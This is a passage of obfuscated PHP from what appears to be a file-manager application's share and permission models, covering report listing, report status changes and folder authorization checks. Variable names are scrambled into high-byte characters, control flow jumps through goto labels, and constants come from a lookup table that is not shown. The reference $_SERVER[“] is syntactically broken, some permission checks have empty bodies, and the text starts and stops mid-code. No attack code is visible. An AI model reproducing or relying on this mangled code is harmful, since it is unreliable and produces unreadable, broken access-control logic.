D•»÷¼Œİ; DŸÇˆÌ²©×: } public function listAll($a·ÍÃÜÊ„·) { goto cÇÅŸòâ; f°Ï¬ä‰¶´: return $E…ê”ğÔÛ; goto Fë°‡ÜŒà—; eµ‡íÁÚÆÕ: $E…ê”ğÔÛ = $this->_makeOrder()->where($fÏ†®ÒÌ¾Ë)->selectPage(20); if (empty($E…ê”ğÔÛ[$f‰Ùƒ§÷¬…[354]])) { return array(); } $this->_listDataApply($E…ê”ğÔÛ[$f‰Ùƒ§÷¬…[354]]); goto f°Ï¬ä‰¶´; cÇÅŸòâ: $f‰Ùƒ§÷¬… =& $_SERVER[“]; $fÏ†®ÒÌ¾Ë = array(); if ($a·ÍÃÜÊ„·[$f‰Ùƒ§÷¬…[1423]]) { $fÏ†®ÒÌ¾Ë[$f‰Ùƒ§÷¬…[1423]] = $a·ÍÃÜÊ„·[$f‰Ùƒ§÷¬…[1423]]; } goto cô¡åßï—ä; cô¡åßï—ä: if ($a·ÍÃÜÊ„·[$f‰Ùƒ§÷¬…[686]]) { $d†„‹¨ĞÎÉ = $a·ÍÃÜÊ„·[$f‰Ùƒ§÷¬…[449]] ? $a·ÍÃÜÊ„·[$f‰Ùƒ§÷¬…[449]] : strtotime(date($f‰Ùƒ§÷¬…[2247])); $fÏ†®ÒÌ¾Ë[$f‰Ùƒ§÷¬…[187]] = array($f‰Ùƒ§÷¬…[321], array($a·ÍÃÜÊ„·[$f‰Ùƒ§÷¬…[686]], $d†„‹¨ĞÎÉ)); } if ($a·ÍÃÜÊ„·[$f‰Ùƒ§÷¬…[29]]) { $fÏ†®ÒÌ¾Ë[$a·ÍÃÜÊ„·[$f‰Ùƒ§÷¬…[29]]] = 1; } else { $fÏ†®ÒÌ¾Ë[] = array($f‰Ùƒ§÷¬…[446] => array($f‰Ùƒ§÷¬…[912], 0), $f‰Ùƒ§÷¬…[448] => array($f‰Ùƒ§÷¬…[912], 0), $f‰Ùƒ§÷¬…[2223] => $f‰Ùƒ§÷¬…[2180]); } if ($a·ÍÃÜÊ„·[$f‰Ùƒ§÷¬…[2176]]) { $fÏ†®ÒÌ¾Ë[] = array($f‰Ùƒ§÷¬…[443] => $a·ÍÃÜÊ„·[$f‰Ùƒ§÷¬…[2176]], $f‰Ùƒ§÷¬…[1328] => array($f‰Ùƒ§÷¬…[735], "\x25{$a·ÍÃÜÊ„·[$f‰Ùƒ§÷¬…[2176]]}\x25"), $f‰Ùƒ§÷¬…[2223] => $f‰Ùƒ§÷¬…[2180]); } goto eµ‡íÁÚÆÕ; Fë°‡ÜŒà—: } public function listDataApply($CÁ’Ú¦ËĞ´) { $this->_listDataApply($CÁ’Ú¦ËĞ´); return $CÁ’Ú¦ËĞ´; } private function _listDataApply(&$F¿Øİåéâ“) { $aéÍ†‡ãìğ =& $_SERVER[“]; $E“ŒÈåÊÊ = array_to_keyvalue($F¿Øİåéâ“, $aéÍ†‡ãìğ[33], $aéÍ†‡ãìğ[1423]); $dî°¸‚ƒµ» = Model($aéÍ†‡ãìğ[479])->userListInfo(array_unique($E“ŒÈåÊÊ)); $e¸ÏÉõêó = array_to_keyvalue($F¿Øİåéâ“, $aéÍ†‡ãìğ[33], $aéÍ†‡ãìğ[369]); $D‰‹ÀÚ»ÕÉ = Model($aéÍ†‡ãìğ[736])->sourceListInfo($e¸ÏÉõêó, !0); foreach ($F¿Øİåéâ“ as &$eŞ¸ˆôï‡) { $E›­¸ÅÇÌì = $eŞ¸ˆôï‡[$aéÍ†‡ãìğ[1423]]; $eŞ¸ˆôï‡[$aéÍ†‡ãìğ[2248]] = $dî°¸‚ƒµ»[$E›­¸ÅÇÌì] ? $dî°¸‚ƒµ»[$E›­¸ÅÇÌì] : !1; $cìÄêáÙ®Ù = $eŞ¸ˆôï‡[$aéÍ†‡ãìğ[369]]; $eŞ¸ˆôï‡[$aéÍ†‡ãìğ[391]] = $D‰‹ÀÚ»ÕÉ[$cìÄêáÙ®Ù] ? $D‰‹ÀÚ»ÕÉ[$cìÄêáÙ®Ù] : !1; } } private function _makeOrder($BÍòô³¸Ï = '') { goto cÙÍ¨²¤; D·ÎãÏÖ©í: $c—„­Ö‹– = Input::get($AàŒìÑã‰ğ[407], $AàŒìÑã‰ğ[7], $AàŒìÑã‰ğ[389], $F¸¯³®µÂõ); $e“ÕŞÓ‘õ˜ = Input::get($AàŒìÑã‰ğ[408], $AàŒìÑã‰ğ[7], $AàŒìÑã‰ğ[2249], array($AàŒìÑã‰ğ[2175], $AàŒìÑã‰ğ[404])); $e“ÕŞÓ‘õ˜ = $C¡ÂŠœ‰ñğ[$e“ÕŞÓ‘õ˜]; goto fÏª“ÇŒªÅ; fÏª“ÇŒªÅ: $BÍòô³¸Ï = $BÍòô³¸Ï . "{$c—„­Ö‹–}\40{$e“ÕŞÓ‘õ˜}"; return $this->order($BÍòô³¸Ï); goto eÎÍ¡ÈöÏ‰; cÙÍ¨²¤: $AàŒìÑã‰ğ =& $_SERVER[“]; $F¸¯³®µÂõ = array($AàŒìÑã‰ğ[187], $AàŒìÑã‰ğ[449], $AàŒìÑã‰ğ[2235], $AàŒìÑã‰ğ[2236]); $C¡ÂŠœ‰ñğ = array($AàŒìÑã‰ğ[402] => $AàŒìÑã‰ğ[403], $AàŒìÑã‰ğ[404] => $AàŒìÑã‰ğ[405]); goto D·ÎãÏÖ©í; eÎÍ¡ÈöÏ‰: } public function reportAdd($AÔø™‘Ô†±) { $aÏŠÃ¥÷• =& $_SERVER[“]; $fµ„†¢¹½ = array($aÏŠÃ¥÷•[441] => $AÔø™‘Ô†±[$aÏŠÃ¥÷•[441]], $aÏŠÃ¥÷•[1423] => USER_ID); if (Model($aÏŠÃ¥÷•[2245])->where($fµ„†¢¹½)->find()) { return !1; } $e¥ÆÙ‰÷Ù• = array($aÏŠÃ¥÷•[441] => $AÔø™‘Ô†±[$aÏŠÃ¥÷•[441]], $aÏŠÃ¥÷•[1328] => $AÔø™‘Ô†±[$aÏŠÃ¥÷•[1328]], $aÏŠÃ¥÷•[369] => $AÔø™‘Ô†±[$aÏŠÃ¥÷•[369]], $aÏŠÃ¥÷•[419] => $AÔø™‘Ô†±[$aÏŠÃ¥÷•[419]], $aÏŠÃ¥÷•[1423] => USER_ID, $aÏŠÃ¥÷•[29] => $AÔø™‘Ô†±[$aÏŠÃ¥÷•[29]], $aÏŠÃ¥÷•[405] => $AÔø™‘Ô†±[$aÏŠÃ¥÷•[405]]); return Model($aÏŠÃ¥÷•[2245])->add($e¥ÆÙ‰÷Ù•); } public function reportList($BÁæ­‚°‹Í) { goto aÑìÕ„Øí; F™¸ñ‚Âæà: $DŠæ‹¤àÎ¨ = array($Fã©ÒË¯Ë¥[402] => $Fã©ÒË¯Ë¥[403], $Fã©ÒË¯Ë¥[404] => $Fã©ÒË¯Ë¥[405]); $c²æÓ©ä ˆ = $Fã©ÒË¯Ë¥[2253] . $DŠæ‹¤àÎ¨[$a»§œãªÒˆ]; $b¥â¶œ“„ğ = Model($Fã©ÒË¯Ë¥[2245])->where($cÌÜ´­½Éß)->order($c²æÓ©ä ˆ)->selectPage(20); goto cËÜµÕ²²; EÍÇÒ‰Èà: if (isset($BÁæ­‚°‹Í[$Fã©ÒË¯Ë¥[29]]) && in_array($BÁæ­‚°‹Í[$Fã©ÒË¯Ë¥[29]], array($Fã©ÒË¯Ë¥[83], $Fã©ÒË¯Ë¥[2250], $Fã©ÒË¯Ë¥[2251], $Fã©ÒË¯Ë¥[2252], $Fã©ÒË¯Ë¥[1910]))) { $cÌÜ´­½Éß[$Fã©ÒË¯Ë¥[29]] = $BÁæ­‚°‹Í[$Fã©ÒË¯Ë¥[29]]; } if (isset($BÁæ­‚°‹Í[$Fã©ÒË¯Ë¥[673]]) && in_array($BÁæ­‚°‹Í[$Fã©ÒË¯Ë¥[673]], array($Fã©ÒË¯Ë¥[470], $Fã©ÒË¯Ë¥[83], $Fã©ÒË¯Ë¥[2250], $Fã©ÒË¯Ë¥[2251]))) { $cÌÜ´­½Éß[$Fã©ÒË¯Ë¥[673]] = $BÁæ­‚°‹Í[$Fã©ÒË¯Ë¥[673]]; } $a»§œãªÒˆ = Input::get($Fã©ÒË¯Ë¥[408], $Fã©ÒË¯Ë¥[7], $Fã©ÒË¯Ë¥[2249], array($Fã©ÒË¯Ë¥[2175], $Fã©ÒË¯Ë¥[404])); goto F™¸ñ‚Âæà; cËÜµÕ²²: if (empty($b¥â¶œ“„ğ[$Fã©ÒË¯Ë¥[354]])) { return array(); } $this->_listDataApply($b¥â¶œ“„ğ[$Fã©ÒË¯Ë¥[354]]); return $b¥â¶œ“„ğ; goto f¡‚×ãä»Å; aÑìÕ„Øí: $Fã©ÒË¯Ë¥ =& $_SERVER[“]; $cÌÜ´­½Éß = array(); if ($BÁæ­‚°‹Í[$Fã©ÒË¯Ë¥[686]]) { $CìÖ¶¨ŸŸ = $BÁæ­‚°‹Í[$Fã©ÒË¯Ë¥[449]] ? $BÁæ­‚°‹Í[$Fã©ÒË¯Ë¥[449]] : strtotime(date($Fã©ÒË¯Ë¥[2247])); $cÌÜ´­½Éß[$Fã©ÒË¯Ë¥[187]] = array($Fã©ÒË¯Ë¥[321], array($BÁæ­‚°‹Í[$Fã©ÒË¯Ë¥[686]], $CìÖ¶¨ŸŸ)); } goto EÍÇÒ‰Èà; f¡‚×ãä»Å: } public function reportStatus($C©ê¯Ò¹‡³) { goto aãŠ×„£; aãŠ×„£: $e‹Ÿ‚©’£— =& $_SERVER[“]; $bĞïÀİé˜ = array($e‹Ÿ‚©’£—[367] => $C©ê¯Ò¹‡³[$e‹Ÿ‚©’£—[367]]); $DËÖÇ’ò¨ = Model($e‹Ÿ‚©’£—[2245])->where($bĞïÀİé˜)->field($e‹Ÿ‚©’£—[2254])->find(); goto DíõóÒƒ£; aâØ‹¥…”: $fò»‰«¯ŒĞ = Model($e‹Ÿ‚©’£—[2245])->where($bĞïÀİé˜)->save($AÆä‰Ê µ); if ($C©ê¯Ò¹‡³[$e‹Ÿ‚©’£—[673]] == $e‹Ÿ‚©’£—[2250]) { if ($DËÖÇ’ò¨[$e‹Ÿ‚©’£—[419]] != $e‹Ÿ‚©’£—[470] && $this->shareFileMeta($DËÖÇ’ò¨[$e‹Ÿ‚©’£—[419]])) { $this->shareFileMeta($DËÖÇ’ò¨[$e‹Ÿ‚©’£—[419]], 0); } $this->remove($DËÖÇ’ò¨[$e‹Ÿ‚©’£—[441]]); return !0; } if ($fò»‰«¯ŒĞ && $C©ê¯Ò¹‡³[$e‹Ÿ‚©’£—[673]] == $e‹Ÿ‚©’£—[2251]) { $FõœÂÒå·ê = $AÆä‰Ê µ[$e‹Ÿ‚©’£—[673]] == $e‹Ÿ‚©’£—[2251] ? 1 : 0; $this->shareFileMeta($DËÖÇ’ò¨[$e‹Ÿ‚©’£—[419]], $FõœÂÒå·ê); $this->removeByFile($DËÖÇ’ò¨[$e‹Ÿ‚©’£—[419]]); } goto E‰­ÓÂ˜ïã; DíõóÒƒ£: if (!$DËÖÇ’ò¨) { return !1; } $AÆä‰Ê µ = array($e‹Ÿ‚©’£—[673] => $C©ê¯Ò¹‡³[$e‹Ÿ‚©’£—[673]]); if ($C©ê¯Ò¹‡³[$e‹Ÿ‚©’£—[673]] == $e‹Ÿ‚©’£—[2251] && $DËÖÇ’ò¨[$e‹Ÿ‚©’£—[673]] == $e‹Ÿ‚©’£—[2251]) { $AÆä‰Ê µ[$e‹Ÿ‚©’£—[673]] = 0; } goto aâØ‹¥…”; E‰­ÓÂ˜ïã: return $fò»‰«¯ŒĞ; goto A¨â¨ó™¥£; A¨â¨ó™¥£: } private function removeByFile($Aë—®ÉŒš) { goto c¥ Ñ†¹Û; c¥ Ñ†¹Û: $e•Á„ø¿İÁ =& $_SERVER[“]; $E„Ÿ½‚å¦ = Model($e•Á„ø¿İÁ[736])->where(array($e•Á„ø¿İÁ[419] => $Aë—®ÉŒš))->field($e•Á„ø¿İÁ[369])->select(); $FŠ³˜‰‹‰¬ = array_to_keyvalue($E„Ÿ½‚å¦, $e•Á„ø¿İÁ[33], $e•Á„ø¿İÁ[369]); goto d‰Êó¡‡«×; B²Œ…·‰¬: $fÉë‘×‡Šï = array_to_keyvalue($E„Ÿ½‚å¦, $e•Á„ø¿İÁ[33], $e•Á„ø¿İÁ[441]); $this->remove($fÉë‘×‡Šï); goto Cè’ä‡ÉÀï; d‰Êó¡‡«×: $F’í‹¥Ä…¢ = array($e•Á„ø¿İÁ[369] => array($e•Á„ø¿İÁ[7], $FŠ³˜‰‹‰¬), $e•Á„ø¿İÁ[446] => 1); $E„Ÿ½‚å¦ = Model($e•Á„ø¿İÁ[2072])->where($F’í‹¥Ä…¢)->field($e•Á„ø¿İÁ[441])->select(); if (empty($E„Ÿ½‚å¦)) { return; } goto B²Œ…·‰¬; Cè’ä‡ÉÀï: } private function shareFileMeta($A´ÓíÅ›§Ú, $DÛÂ¦òï¿Ü = null) { $D¢ŒÕù‹³ =& $_SERVER[“]; $dä­í½´À = array($D¢ŒÕù‹³[419] => $A´ÓíÅ›§Ú, $D¢ŒÕù‹³[89] => $D¢ŒÕù‹³[2255]); if (is_null($DÛÂ¦òï¿Ü)) { return Model($D¢ŒÕù‹³[2256])->where($dä­í½´À)->find(); } $dä­í½´À[$D¢ŒÕù‹³[359]] = $DÛÂ¦òï¿Ü; Model($D¢ŒÕù‹³[2256])->add($dä­í½´À, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\x72\x63\x65\x5f\x61\x75\164\150"; public function getAuth($F¾‡óéšøÌ) { goto Cõ‚ÎÑä¤; Cõ‚ÎÑä¤: $B²Õ ºØƒ’ =& $_SERVER[“]; $cà—ã¡¸ƒ’ = $B²Õ ºØƒ’[2257]; $fŠí›ßé¸µ = array($B²Õ ºØƒ’[369] => $F¾‡óéšøÌ); goto Fâ‰Œ¥Ã‰; Fâ‰Œ¥Ã‰: $e‹ŞÉºÄ°§ = $this->field($cà—ã¡¸ƒ’)->order($B²Õ ºØƒ’[367])->where($fŠí›ßé¸µ)->select(); $d®ñÙË‡Õ™ = array(); foreach ($e‹ŞÉºÄ°§ as $e×ï‰†ƒÉó) { if (Model($B²Õ ºØƒ’[2258])->listData($e×ï‰†ƒÉó[$B²Õ ºØƒ’[2239]])) { $d®ñÙË‡Õ™[] = $e×ï‰†ƒÉó; } } goto cÌÈçõ¶±µ; cÌÈçõ¶±µ: return $d®ñÙË‡Õ™; goto cæ³àŒæ¤; cæ³àŒæ¤: } public function setAuth($FÌâÁö×‰‚, $B‰ñ½¿ÛÉ) { goto d¼è‰ËÈ‹; F£ŒÀæÓ…: $cö–¥Ó–… = 1; $d•Á¬òôÈ = $f®í®Ã®óÁ[$Bç µÃäòÉ[458]]; if ($d•Á¬òôÈ != $cö–¥Ó–…) { $FÓâÅ‘¶ô = array($Bç µÃäòÉ[2095] => $d•Á¬òôÈ); $DÛòÏ±ëÜ = Model($Bç µÃäòÉ[2174])->field($Bç µÃäòÉ[1423])->where($FÓâÅ‘¶ô)->select(); $DÛòÏ±ëÜ = array_to_keyvalue($DÛòÏ±ëÜ, $Bç µÃäòÉ[33], $Bç µÃäòÉ[1423]); } goto F„ÆâÕø; eö‰ƒ‚Ìƒ™: $this->where(array($Bç µÃäòÉ[383] => $FÌâÁö×‰‚))->delete(); $this->addAll($B‰Ã¾Şª·À); return !0; goto c°±İÆÒÛ; d¼è‰ËÈ‹: $Bç µÃäòÉ =& $_SERVER[“]; $f®í®Ã®óÁ = Model($Bç µÃäòÉ[1104])->sourceInfo($FÌâÁö×‰‚); if ($f®í®Ã®óÁ[$Bç µÃäòÉ[371]] != SourceModel::TYPE_GROUP) { return !1; } goto F£ŒÀæÓ…; F„ÆâÕø: $e‘‰æ®Æ¾Ù = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $B‰Ã¾Şª·À = array(); foreach ($B‰ñ½¿ÛÉ as $Fê áã¥ãç) { if (!in_array($Fê áã¥ãç[$Bç µÃäòÉ[371]], $e‘‰æ®Æ¾Ù)) { show_json(LNG($Bç µÃäòÉ[2259]), !1); } if ($d•Á¬òôÈ != $cö–¥Ó–…) { if ($Fê áã¥ãç[$Bç µÃäòÉ[371]] == SourceModel::TYPE_GROUP) { } if ($Fê áã¥ãç[$Bç µÃäòÉ[458]] != 0 && !in_array($Fê áã¥ãç[$Bç µÃäòÉ[458]], $DÛòÏ±ëÜ)) { } } if ($Fê áã¥ãç[$Bç µÃäòÉ[458]] == 0) { $Fê áã¥ãç[$Bç µÃäòÉ[371]] = SourceModel::TYPE_USER; } $B‰Ã¾Şª·À[] = array($Bç µÃäòÉ[369] => $FÌâÁö×‰‚, $Bç µÃäòÉ[371] => intval($Fê áã¥ãç[$Bç µÃäòÉ[371]]), $Bç µÃäòÉ[458] => intval($Fê áã¥ãç[$Bç µÃäòÉ[458]]), $Bç µÃäòÉ[2239] => intval($Fê áã¥ãç[$Bç µÃäòÉ[2239]]) ? intval($Fê áã¥ãç[$Bç µÃäòÉ[2239]]) : 0, $Bç µÃäòÉ[2240] => intval($Fê áã¥ãç[$Bç µÃäòÉ[2240]]) ? intval($Fê áã¥ãç[$Bç µÃäòÉ[2240]]) : -1); } goto eö‰ƒ‚Ìƒ™; c°±İÆÒÛ: } public function authClear($f‘ƒ˜ÌÔ¥·) { $a£¸™»·â =& $_SERVER[“]; $D’‚×ê±Ú = Model($a£¸™»·â[1104])->sourceInfo($f‘ƒ˜ÌÔ¥·); $EäÖ¿³¹ŞÓ = array($f‘ƒ˜ÌÔ¥·); if ($D’‚×ê±Ú[$a£¸™»·â[370]] == $a£¸™»·â[83]) { $c°ØğÜáó¤ = array($a£¸™»·â[527] => array($a£¸™»·â[485], $D’‚×ê±Ú[$a£¸™»·â[461]] . $f‘ƒ˜ÌÔ¥· . $a£¸™»·â[486])); $EäÖ¿³¹ŞÓ = Model($a£¸™»·â[1104])->field($a£¸™»·â[383])->where($c°ØğÜáó¤)->getField($a£¸™»·â[369], !0); $EäÖ¿³¹ŞÓ[] = $f‘ƒ˜ÌÔ¥·; } $this->where(array($a£¸™»·â[383] => array($a£¸™»·â[384], $EäÖ¿³¹ŞÓ)))->delete(); return !0; } public function get($B›„ÍÙ„‘ç) { $aõ¾¬Ôñù† = $this->getSourceList(array($B›„ÍÙ„‘ç), !0); return $aõ¾¬Ôñù†[0]; } public function getSourceList($b¬”ìç»¯î, $eôÏ¯ª”ÃÆ = false) { goto b–‰ô–Åê´; cÛâß†Ùá¼: $dÚÔ¿¡ÖèØ = array_values(array_unique($dÚÔ¿¡ÖèØ)); if (!$dÚÔ¿¡ÖèØ) { return array(); } $CÑœ­µ = $cÇ«øĞ¥·Š[2261]; goto F½ÀË¦™‚÷; dâ˜Ãé§×­: $aÙ·èõ·å = array(); foreach ($eôÏ¯ª”ÃÆ as $d±Ö–»éÊÏ => $fìô·‡¨èë) { $aÙ·èõ·å[$d±Ö–»éÊÏ] = $this->makeSourceAuth($fìô·‡¨èë, $bÄõ˜Ë”šĞ); } return $aÙ·èõ·å; goto B´Ğòƒ¢†; b–‰ô–Åê´: $cÇ«øĞ¥·Š =& $_SERVER[“]; if (!$b¬”ìç»¯î) { return array(); } $Dí’šŒéˆ‰ = Model($cÇ«øĞ¥·Š[1104]); goto c‰Ş›¹µ·; c‰Ş›¹µ·: if (!$eôÏ¯ª”ÃÆ) { $E™‚Œ¹êˆ = array($cÇ«øĞ¥·Š[383] => array($cÇ«øĞ¥·Š[384], $b¬”ìç»¯î)); $eôÏ¯ª”ÃÆ = $Dí’šŒéˆ‰->field($cÇ«øĞ¥·Š[2260])->where($E™‚Œ¹êˆ)->select(); $eôÏ¯ª”ÃÆ = array_to_keyvalue($eôÏ¯ª”ÃÆ, $cÇ«øĞ¥·Š[369]); } $dÚÔ¿¡ÖèØ = $b¬”ìç»¯î; foreach ($eôÏ¯ª”ÃÆ as $Bç‹Øñï => $dÁ„´ùŞ­) { $EñÜá¦æÃ‘ = $Dí’šŒéˆ‰->parentLevelArray($dÁ„´ùŞ­[$cÇ«øĞ¥·Š[461]]); $dÚÔ¿¡ÖèØ = array_merge($dÚÔ¿¡ÖèØ, $EñÜá¦æÃ‘, array($Bç‹Øñï)); } goto cÛâß†Ùá¼; F½ÀË¦™‚÷: $E™‚Œ¹êˆ = array($cÇ«øĞ¥·Š[383] => array($cÇ«øĞ¥·Š[384], $dÚÔ¿¡ÖèØ)); $bÄõ˜Ë”šĞ = $this->field($CÑœ­µ)->where($E™‚Œ¹êˆ)->select(); $bÄõ˜Ë”šĞ = array_to_keyvalue_group($bÄõ˜Ë”šĞ, $cÇ«øĞ¥·Š[369]); goto dâ˜Ãé§×­; B´Ğòƒ¢†: } public function authDeepCheck($eã²ŸŞˆ‰ñ) { goto fÕ‰çÍ³ÄŒ; b¡ÚÆÌŒÅå: if (!in_array($eã²ŸŞˆ‰ñ, $EÀÀğÂ¥Î[$B„˜¦Ï Ü¿[2262]])) { return !1; } $a’à¹ï» = array(); foreach ($EÀÀğÂ¥Î[$B„˜¦Ï Ü¿[2263]] as $b¦ì¯Ú¶¡‡ => $aÀ­é‰Ÿªğ) { if (!in_array($eã²ŸŞˆ‰ñ, $aÀ­é‰Ÿªğ)) { continue; } $a’à¹ï»[] = $b¦ì¯Ú¶¡‡; } goto eËÈá ë™Ñ; fÕ‰çÍ³ÄŒ: $B„˜¦Ï Ü¿ =& $_SERVER[“]; if (_get($GLOBALS, $B„˜¦Ï Ü¿[459])) { return !1; } $EÀÀğÂ¥Î = $this->makeAuthDeep(); goto b¡ÚÆÌŒÅå; eËÈá ë™Ñ: $cËµá‚•§õ = $a’à¹ï» ? $a’à¹ï»[0] : $eã²ŸŞˆ‰ñ; return array($B„˜¦Ï Ü¿[377] => -1, $B„˜¦Ï Ü¿[418] => array($B„˜¦Ï Ü¿[385] => $B„˜¦Ï Ü¿[1018], $B„˜¦Ï Ü¿[2101] => $B„˜¦Ï Ü¿[470], $B„˜¦Ï Ü¿[386] => LNG($B„˜¦Ï Ü¿[2264]), $B„˜¦Ï Ü¿[2113] => $B„˜¦Ï Ü¿[2265]), $B„˜¦Ï Ü¿[2266] => array($B„˜¦Ï Ü¿[388] => $B„˜¦Ï Ü¿[2267], $B„˜¦Ï Ü¿[75] => $cËµá‚•§õ)); goto b¸š´—õÙš; b¸š´—õÙš: } protected function makeAuthDeep() { goto B–†¬”»æ; C¯ªæö³‚È: return $CÑøŒ•Ø«¥; goto e•¿ˆ¸Ü¹; fÑÑ‡ŞÖÍî: $fìŸ ½ó‹Œ = Model($cíÒíÛï¤ë[2268])->listData(); $b¬½â«‡¿ = array(); foreach ($fìŸ ½ó‹Œ as $Dé¬ĞŸŒ”¼) { if ($Dé¬ĞŸŒ”¼[$cíÒíÛï¤ë[376]] == 0 && $Dé¬ĞŸŒ”¼[$cíÒíÛï¤ë[2115]] == $cíÒíÛï¤ë[83]) { $b¬½â«‡¿[] = $Dé¬ĞŸŒ”¼[$cíÒíÛï¤ë[367]]; } } goto B»„˜õÒÛÛ; a™¾‚æ¯ê’: $a¹¥–¢¦çó = array(); $e ·Á¨ä¨ = array(); $B÷ˆƒÌ±“­ = array(); goto aæ’ˆ–õ‡; BÔ•Èç¶³‡: $E…›ÚÇÆÍ· = Model($cíÒíÛï¤ë[1104]); $FÃîÇƒèî = Model($cíÒíÛï¤ë[460]); $aƒô·£Ç‚ß = array(); goto a™¾‚æ¯ê’; B»„˜õÒÛÛ: $BŠ¯”‘Æ½ = Session::get($cíÒíÛï¤ë[2224]); $BŠ¯”‘Æ½ = array_to_keyvalue($BŠ¯”‘Æ½, $cíÒíÛï¤ë[33], $cíÒíÛï¤ë[2095]); $DŠğäÆ¾ï† = array($cíÒíÛï¤ë[371] => SourceModel::TYPE_USER, $cíÒíÛï¤ë[458] => USER_ID); goto eõÁ”·‘Æ; B–†¬”»æ: $cíÒíÛï¤ë =& $_SERVER[“]; static $CÑøŒ•Ø«¥ = false; if ($CÑøŒ•Ø«¥) { return $CÑøŒ•Ø«¥; } goto fÑÑ‡ŞÖÍî; aæ’ˆ–õ‡: if ($eïí©—ÄåÚ) { $d…¨ìÉ­ï¶ = $E…›ÚÇÆÍ·->where(array($cíÒíÛï¤ë[369] => array($cíÒíÛï¤ë[384], $eïí©—ÄåÚ)))->select(); foreach ($d…¨ìÉ­ï¶ as $CâÛÈÚ¡šÕ) { $Cö¤Š„¼ˆÉ = $E…›ÚÇÆÍ·->parentLevelArray($CâÛÈÚ¡šÕ[$cíÒíÛï¤ë[461]]); $C·ÕÓ„Ì… = array_merge($C·ÕÓ„Ì…, $Cö¤Š„¼ˆÉ); $cßŸÛ¤¯ç[] = $CâÛÈÚ¡šÕ[$cíÒíÛï¤ë[458]]; $aƒô·£Ç‚ß[$CâÛÈÚ¡šÕ[$cíÒíÛï¤ë[369]]] = $Cö¤Š„¼ˆÉ; $a¹¥–¢¦çó[$CâÛÈÚ¡šÕ[$cíÒíÛï¤ë[369]]] = $CâÛÈÚ¡šÕ[$cíÒíÛï¤ë[458]]; } } $cßŸÛ¤¯ç = array_values(array_unique($cßŸÛ¤¯ç)); $eËÅÁ’ç = $cßŸÛ¤¯ç; goto e°Æµöéòô; e°Æµöéòô: foreach ($eËÅÁ’ç as $fïŒ„ÂÏÌé) { $DÙ÷ì˜˜Ş = $FÃîÇƒèî->getInfo($fïŒ„ÂÏÌé); $Cö¤Š„¼ˆÉ = $E…›ÚÇÆÍ·->parentLevelArray($DÙ÷ì˜˜Ş[$cíÒíÛï¤ë[461]]); $cßŸÛ¤¯ç = array_merge($cßŸÛ¤¯ç, $Cö¤Š„¼ˆÉ); } $cßŸÛ¤¯ç = array_values(array_unique($cßŸÛ¤¯ç)); foreach ($cßŸÛ¤¯ç as $fïŒ„ÂÏÌé) { $DÙ÷ì˜˜Ş = $FÃîÇƒèî->getInfo($fïŒ„ÂÏÌé); $C·ÕÓ„Ì…[] = $DÙ÷ì˜˜Ş[$cíÒíÛï¤ë[391]][$cíÒíÛï¤ë[369]]; $e ·Á¨ä¨[$fïŒ„ÂÏÌé] = $DÙ÷ì˜˜Ş[$cíÒíÛï¤ë[391]][$cíÒíÛï¤ë[369]]; $B÷ˆƒÌ±“­[$fïŒ„ÂÏÌé] = $E…›ÚÇÆÍ·->parentLevelArray($DÙ÷ì˜˜Ş[$cíÒíÛï¤ë[461]]); } goto bñ®íÊÀâ×; e’ßˆ‘œ³Ì: $eïí©—ÄåÚ = array_to_keyvalue($A¹¡®›Ì¬˜, $cíÒíÛï¤ë[33], $cíÒíÛï¤ë[369]); $C·ÕÓ„Ì… = array(); $cßŸÛ¤¯ç = $BŠ¯”‘Æ½; goto BÔ•Èç¶³‡; bñ®íÊÀâ×: foreach ($aƒô·£Ç‚ß as $D¥…ä³ãŞ¦ => $bÏ×óÈ×¸Á) { $BïºÖ‘ë = $a¹¥–¢¦çó[$D¥…ä³ãŞ¦]; if (!$BïºÖ‘ë || !$e ·Á¨ä¨[$BïºÖ‘ë]) { continue; } $cÄ»ù¤É†Œ = array(); foreach ($B÷ˆƒÌ±“­[$BïºÖ‘ë] as $fïŒ„ÂÏÌé) { $cÄ»ù¤É†Œ[] = $e ·Á¨ä¨[$fïŒ„ÂÏÌé]; } $aƒô·£Ç‚ß[$D¥…ä³ãŞ¦] = array_merge($cÄ»ù¤É†Œ, $bÏ×óÈ×¸Á); } $C·ÕÓ„Ì… = array_values(array_unique($C·ÕÓ„Ì…)); $CÑøŒ•Ø«¥ = array($cíÒíÛï¤ë[2262] => $C·ÕÓ„Ì…, $cíÒíÛï¤ë[2263] => $aƒô·£Ç‚ß); goto C¯ªæö³‚È; eõÁ”·‘Æ: if ($BŠ¯”‘Æ½) { $DŠğäÆ¾ï† = array(array($cíÒíÛï¤ë[371] => SourceModel::TYPE_USER, $cíÒíÛï¤ë[458] => USER_ID), array($cíÒíÛï¤ë[371] => SourceModel::TYPE_GROUP, $cíÒíÛï¤ë[458] => array($cíÒíÛï¤ë[384], $BŠ¯”‘Æ½)), $cíÒíÛï¤ë[900] => $cíÒíÛï¤ë[2180]); } if ($b¬½â«‡¿) { $DŠğäÆ¾ï† = array($DŠğäÆ¾ï†, $cíÒíÛï¤ë[2239] => array($cíÒíÛï¤ë[2269], $b¬½â«‡¿)); } $A¹¡®›Ì¬˜ = $this->field($cíÒíÛï¤ë[2270])->where($DŠğäÆ¾ï†)->select(); goto e’ßˆ‘œ³Ì; e•¿ˆ¸Ü¹: } private function makeSourceAuth($eÍ”Æ°©Ê¦, $CÜ¢¸„õĞ) { goto F·•®çÙá; F‚ò‹¤Í³ì: $EôÄ—´ ­¥ = $eÍ”Æ°©Ê¦[$AìÙá‹ëŞÔ[458]]; $e¿Š®¡Õô´ = $eÍ”Æ°©Ê¦[$AìÙá‹ëŞÔ[371]] == SourceModel::TYPE_GROUP; if ($e¿Š®¡Õô´ && isset($eáà’ƒÎ£[$EôÄ—´ ­¥]) && !_get($GLOBALS, $AìÙá‹ëŞÔ[459])) { $B½«êïÇ‚Ñ = $eáà’ƒÎ£[$EôÄ—´ ­¥]; if (Model($AìÙá‹ëŞÔ[2258])->authCheckRoot($B½«êïÇ‚Ñ[$AìÙá‹ëŞÔ[376]][$AìÙá‹ëŞÔ[376]])) { $dù²Ó‚»ï¸ = Model($AìÙá‹ëŞÔ[460])->getInfo($EôÄ—´ ­¥); $D½³ØÄÀŞ’ = array($AìÙá‹ëŞÔ[2271] => intval($B½«êïÇ‚Ñ[$AìÙá‹ëŞÔ[376]][$AìÙá‹ëŞÔ[376]]), $AìÙá‹ëŞÔ[2272] => $B½«êïÇ‚Ñ[$AìÙá‹ëŞÔ[376]], 